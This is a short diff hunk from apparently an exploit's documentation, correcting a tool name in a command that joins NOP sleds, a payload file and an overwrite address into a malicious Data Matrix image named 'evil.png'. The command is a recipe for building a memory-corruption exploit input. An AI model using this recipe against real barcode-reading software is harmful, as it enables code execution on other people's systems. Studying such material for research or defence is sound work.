@@ -17,4 +17,4 @@ addr.bin is addr to overwite with
 
 To build a proper exploit image:
 
-$ cat nop1.bin payload.bin nop2.bin addr.bin | dmtrwrite -e 8 -o evil.png
+$ cat nop1.bin payload.bin nop2.bin addr.bin | dmtxwrite -e 8 -o evil.png
